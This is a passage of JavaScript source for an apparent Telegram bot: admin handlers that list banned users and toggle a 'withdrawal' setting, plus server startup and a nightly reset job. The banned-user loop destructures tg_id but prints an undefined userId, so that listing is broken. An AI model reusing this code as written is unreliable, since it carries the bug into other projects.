  ctx.answerCbQuery();
  const banned = await starkNilX.find({ ban: true });
  if (banned.length == 0) {
    return ctx.reply("No banned users yet");
  }
  let txt =
    "<b>🚫 #BANNED_USERS\n🔢 Total banned</b>: " + banned.length + " Users\n\n";
  for (const user of banned) {
    const { tg_id } = user;
    txt += "<b>🆔 UserId:</b> <code>" + userId + "</code>\n";
  }
  await ctx.replyWithHTML(txt, {
    parse_mode: "HTML",
  });
});

bot.action(/\/activate_(.+)/, validAdmin, async (ctx) => {
  ctx.answerCbQuery();

  const type = ctx.match[1];
  if (type === "1") {
    await starkNilX.updateBot({
      $set: {
        withdrawal: "enabled",
      },
    });
    ctx.reply("✅ Withdrawal has been enabled successfully");
  } else {
    await starkNilX.updateBot({
      $set: {
        withdrawal: "disabled",
      },
    });
    ctx.reply("⛔️ Withdrawal has been disabled successfully");
  }
});

const port = process.env.PORT;

bot.launch({ dropPendingUpdates: true });

app
  .listen(port, () => {
    console.log(`Server is running on port ${port}`);
  })
  .on("error", (err) => {
    console.error("Server error:", err);
  });

cron.schedule("0 0 * * *", async () => {
  await resetAll();
});

/*

setTimeout( async ()=> {
  await resetAll();
}, 10000);

*/
